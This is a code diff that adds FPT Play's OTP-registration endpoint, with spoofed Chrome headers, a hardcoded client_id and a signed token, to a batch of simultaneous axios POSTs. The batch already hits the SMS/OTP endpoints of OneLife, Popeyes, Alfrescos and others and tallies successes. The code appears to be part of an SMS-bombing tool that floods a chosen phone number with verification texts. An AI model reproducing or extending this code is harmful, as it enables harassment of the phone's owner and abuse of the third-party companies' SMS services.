@@ -509,6 +509,27 @@ const payload = {
           sendTime: 1703860383205,
           type: 1,
         };
+
+    const fptHeaders = {
+          'authority': 'api.fptplay.net',
+          'accept': 'application/json, text/plain, */*',
+          'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+          'content-type': 'application/json; charset=UTF-8',
+          'dnt': '1',
+          'origin': 'https://fptplay.vn',
+          'referer': 'https://fptplay.vn/',
+          'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+          'sec-ch-ua-mobile': '?0',
+          'sec-ch-ua-platform': '"Windows"',
+          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+          'x-did': 'ABF6AD8B2ACE7D0E',
+        };
+
+        const fptData = {
+          phone: phone,
+          country_code: 'VN',
+          client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
+        };
             
 
     // Initial message to be edited later
@@ -578,6 +599,11 @@ const payload = {
         axios.post('https://api.onelife.vn/v1/gateway/', oneLifeData, { headers: oneLifeHeaders }),
         axios.post('https://api.popeyes.vn/api/v1/register', data, { headers: popeHeaders, cookies: popeCookies, withCredentials: true }), 
         axios.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', alfrescosData, { headers: alfrescosHeaders, params: alfrescosParams }), 
+        axios.post(
+          'https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=CUZ-KiJXaLMJ7FszwK_Zrw&e=1703864126&device=Chrome(version%253A120.0.0.0)&drm=1',
+          fptData,
+          { headers: fptHeaders }
+        ), 
         ])
       .then(() => {
         successCount += 16;
